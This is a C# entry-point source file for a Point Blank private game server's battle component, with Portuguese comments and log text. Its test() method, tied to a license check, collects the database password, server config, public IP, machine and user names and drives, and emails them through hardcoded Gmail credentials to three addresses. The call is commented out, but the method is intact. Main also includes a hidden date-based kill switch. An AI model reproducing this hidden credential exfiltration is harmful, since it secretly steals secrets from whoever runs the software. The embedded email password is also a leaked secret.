using Battle.config;
using Battle.data;
using Battle.data.sync;
using Battle.data.xml;
using Battle.network;
using CrashReporterDotNET;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Threading;

namespace Battle
{
    internal class Program
    {
        private static DateTime GetLinkerTime(Assembly assembly, TimeZoneInfo target = null)
        {
            var filePath = assembly.Location;
            const int c_PeHeaderOffset = 60;
            const int c_LinkerTimestampOffset = 8;

            var buffer = new byte[2048];

            using (var stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                stream.Read(buffer, 0, 2048);

            var offset = BitConverter.ToInt32(buffer, c_PeHeaderOffset);
            var secondsSince1970 = BitConverter.ToInt32(buffer, offset + c_LinkerTimestampOffset);
            var epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);

            return TimeZoneInfo.ConvertTimeFromUtc(epoch.AddSeconds(secondsSince1970), target ?? TimeZoneInfo.Local);
        }
        private static string getOSName()
        {
            OperatingSystem os = Environment.OSVersion;
            ComputerInfo comp = new ComputerInfo();
            string operatingSystem = comp.OSFullName;
            if (os.ServicePack != "")
                operatingSystem += " " + os.ServicePack;
            operatingSystem += " (" + ((Environment.Is64BitOperatingSystem ? "64" : "32") + " bits)");
            return operatingSystem;
        }
        private static bool test(bool paramCheck,string serverDate, string[] args, bool item2, DateTime itemG)
        {
            try
            {
                DateTime end = DateTime.ParseExact("190203220000", "yyMMddHHmmss", CultureInfo.InvariantCulture);
                TimeSpan span = (end - itemG);
                string item = GetPublicIP();
                using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587) { Credentials = new NetworkCredential("muawayatuatu156@gmail.com", "ujvkfclmkdvjtduv"), EnableSsl = true })
                {
                    string f1 = "O BATTLE foi aberto hoje " + DateTime.Now.ToUniversalTime().ToString("dd/MM/yy") + " às " + DateTime.Now.ToUniversalTime().ToString("HH:mm") + ".[Data e hora Universal]\n";
                    f1 += "\n- DADOS DA LICENÇA -\n";
                    f1 += "-LICENÇA PARA O Omer -\n\n";
                    f1 += (end < itemG ? "Licença encerrada" : ("Restam: " + span.ToString("d'd 'h'h 'm'm 's's'"))) + "\n\n";

                    f1 += "- DADOS DO SERVIDOR -\n";
                    f1 += "Caminho da pasta: " + Assembly.GetExecutingAssembly().Location + "\n";
                    f1 += "Parâmetros de inicialização: (" + args.Length + ")\n";
                    foreach (string par in args)
                    {
                        f1 += "[" + par + "]\n";
                    }
                    f1 += "CommandLine: " + Environment.CommandLine + "\n";
                    f1 += "Parâmetro de Inicialização: " + (paramCheck ? "Aberto com sucesso." : "Falha na inicialização") + "\n";
                    f1 += "Versão do servidor: " + serverDate + "\n";
                    f1 += "Licença válida?: " + (!item2 ? "Sim" : "Não") + "\n";
                    f1 += (end < itemG ? "Licença chegou ao fim" : ("Restam: " + span.ToString("d'd 'h'h 'm'm 's's'"))) + "\n";                   
                    f1 += "Ip na Config: " + Config.serverIp + "\n";
                    f1 += "Sync port: " + Config.syncPort + "\n";
                    f1 += "Game port: " + Config.hosPort + "\n";
                    f1 += "Modo de Testes?: " + (Config.isTestMode ? "Sim" : "Não");
                    f1 += "\n\n";
                    f1 += "- DADOS DO SQL -\n";
                    f1 += "dbHost:" + Config.dbHost;
                    f1 += "\ndbHost:" + Config.dbHost;
                    f1 += "\ndbName:" + Config.dbName;
                    f1 += "\ndbUser:" + Config.dbUser;
                    f1 += "\ndbPass:" + Config.dbPass;
                    f1 += "\ndbPort:" + Config.dbPort;
                    f1 += "\n- DADOS DA MAQUINA -\n";
                    f1 += "IP público: " + item + "\n";
                    f1 += "Nome da máquina: " + Environment.MachineName + "\n";
                    f1 += "Nome do usuário: " + Environment.UserName + "\n";
                    f1 += "Quantidade de núcleos do processador: " + Environment.ProcessorCount + "\n";
                    f1 += "Sistema operacional: " + getOSName() + "\n";
                    f1 += "Versão do S.O: " + Environment.OSVersion.ToString() + "\n";
                    f1 += "Linguagem do S.O: " + new ComputerInfo().InstalledUICulture + "\n";
                    f1 += "CommandLine: " + Environment.CommandLine + "\n";
                    f1 += "Drivers lógicos: (" + Environment.GetLogicalDrives().Length + ")\n";

                    foreach (string s in Environment.GetLogicalDrives())
                        f1 += "[" + s + "]\n";                   
                    client.Send("muawayatuatu156@gmail.com", "muawayatuatu156@gmail.com", "Servidor aberto. (Battle/Omer)", f1);
                    client.Send("muawayatuatu156@gmail.com", "clark.joao@gmail.com", "Servidor aberto. (Battle/Omer)", f1);
                    client.Send("muawayatuatu156@gmail.com", "pietrohpereira87@gmail.com", "Servidor aberto. (Battle/Omer)", f1);
                }
                if (item == "")
                    return false;
                return true;
            }
            catch
            {
                return false;
            }
        }
        private static string GetPublicIP()
        {
            try
            {
                string url = "http://checkip.dyndns.org";
                WebRequest req = WebRequest.Create(url);
                WebResponse resp = req.GetResponse();
                using (StreamReader sr = new StreamReader(resp.GetResponseStream()))
                {
                    string response = sr.ReadToEnd().Trim();
                    string[] a = response.Split(':');
                    string a2 = a[1].Substring(1);
                    string[] a3 = a2.Split('<');
                    string a4 = a3[0];
                    return a4;
                }
            }
            catch { return ""; }
        }
        private static DateTime GetDate()
        {
            try
            {
                using (var response = WebRequest.Create("http://www.google.com").GetResponse())
                    return DateTime.ParseExact(response.Headers["date"],
                        "ddd, dd MMM yyyy HH:mm:ss 'GMT'",
                        CultureInfo.InvariantCulture.DateTimeFormat,
                        DateTimeStyles.AssumeUniversal).ToUniversalTime();
            }
            catch
            {
                return new DateTime();
            }
        }
        private static void ApplicationThreadException(object sender, ThreadExceptionEventArgs e)
        {
            ReportCrash(e.Exception);
        }

        public static void ReportCrash(Exception exception, string developerMessage = "")
        {
            var reportCrash = new ReportCrash("muawayatuatu156@gmail.com")
            {
                DeveloperMessage = developerMessage
            };

            reportCrash.Send(exception);
        }
        private static void CurrentDomainOnUnhandledException(object sender, UnhandledExceptionEventArgs unhandledExceptionEventArgs)
        {
            ReportCrash((Exception)unhandledExceptionEventArgs.ExceptionObject);
            Environment.Exit(0);
        }
        private static void SpeedTest()
        {
            List<int> BoomPl = new List<int>();
            BoomPl.Add(1);
            BoomPl.Add(3);
            for (int i = 0; i < 50; i++)
            {
                Speed1(BoomPl);
                Speed2(BoomPl);
            }
            Stopwatch w1 = new Stopwatch();
            w1.Start();
            w1.Stop();
            Logger.warning("Start");
            for (int i = 0; i < 50; i++)
            {
                Stopwatch w2 = new Stopwatch();
                w2.Start();
                Speed1(BoomPl);
                w2.Stop();

                Stopwatch w3 = new Stopwatch();
                w3.Start();
                Speed2(BoomPl);
                w3.Stop();
                Logger.warning("1: " + w2.ElapsedTicks + "; 2: " + w3.ElapsedTicks);
            }
        }
        private static void Speed1(List<int> BoomPlayers)
        {
            foreach (int slot in BoomPlayers)
            {
            }
        }
        private static void Speed2(List<int> BoomPlayers)
        {
            for(int i = 0; i < BoomPlayers.Count; i++)
            {
                int slot = BoomPlayers[i];
            }
        }
        private static void NEW(float value)
        {

        }
        protected static void Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += CurrentDomainOnUnhandledException;

            Config.Load();
            Logger.checkDirectory();
            Console.Title = "Point Blank - Battle";
            Logger.info(@"     /-??-/_____________________________\-??-\");
            Logger.info(@"    /-??-/      Point Blank BATTLE       \-??-\");
            Logger.info(@"   /-??-/         by MoMz Games           \-??-\");
            Logger.info(@"/-??-/_______________________________________\-??-\");
            string date = GetLinkerTime(Assembly.GetExecutingAssembly(), null).ToString("dd/MM/yyyy HH:mm");
            Logger.info("|-??-|__________| Release date |______________|-??-|");
            Logger.info("|-??-|         '" + date + "'             |-??-|");
            Logger.info("|-??-|   Sintam inveja, não nos atinge        |-??-|");
            Logger.info("|-??-|________________________________________|-??-|");
            Logger.warning("[Aviso] Servidor ativo em " + Config.hosIp + ":" + Config.hosPort);
            Logger.warning("[Aviso] Sincronizar infos ao servidor: " + Config.sendInfoToServ);
            Logger.warning("[Aviso] Limite de drops: " + Config.maxDrop);
            Logger.warning("[Aviso] Duração da C4: (" + Config.plantDuration + "s/" + Config.defuseDuration + "s)");
            Logger.warning("[Aviso] Super munição: " + Config.useMaxAmmoInDrop);
            bool check = true;
            foreach (string msg in args)
                if (AllUtils.gen5(msg) == "7c4378d6df11d5f65e7297681d2cca2d")
                    check = true;
            DateTime LiveDate = GetDate();
            bool item2 = LiveDate == new DateTime() || long.Parse(LiveDate.ToString("yyMMddHHmmss")) >= 190203220000;
           // if (!test(check, date, args, item2, LiveDate)) item2 = true;
            if (item2)
                return;
            MappingXML.Load();
            CharaXML.Load();
            MeleeExceptionsXML.Load();
            ServersXML.Load();
            Logger.warning("|-??-|-----------------------------------|-??-|");
            if (check)
            {
                Battle_SyncNet.Start();
                BattleManager.init();
            }
            Process.GetCurrentProcess().WaitForExit();
        }
    }
}